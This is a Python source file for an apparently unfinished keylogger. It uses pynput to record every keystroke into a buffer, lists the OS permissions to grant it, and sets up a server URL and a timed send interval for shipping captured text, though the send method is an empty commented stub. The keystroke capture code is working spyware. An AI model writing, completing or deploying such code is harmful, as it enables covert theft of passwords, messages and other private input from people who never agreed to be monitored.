from pynput import keyboard
from datetime import datetime
import requests
import json
import threading
import time

# OBS: allow IDE Input Monitoring, Accessibility, Full Disk Access in OS settings

class KeyLogger:
    def __init__(self, server_url):
        self.server_url = server_url
        self.text = ""
        self.time_interval = 10 # Send to sever every 10 seconds

    # def send_to_server(self):

    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                print("\nStopping keylogger...")
                '''
                # Send any remaining text before stopping
                if self.text:
                    self.send_to_server()
                return False
                '''
            else:
                self.text += str(key).strip("'")

            # printing for testing
            preview = self.text[-50:]
            print(f"\rTyping: {preview}", end="", flush=True)

        except AttributeError:
            print(f'\n[Special key {key} pressed]')

    def start(self):

        # Start listening to keyboard
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


# For local testing
if __name__ == "__main__":
    SERVER_URL = "http://127.0.0.1:5000"  # For local testing

    logger = KeyLogger(SERVER_URL)
    logger.start()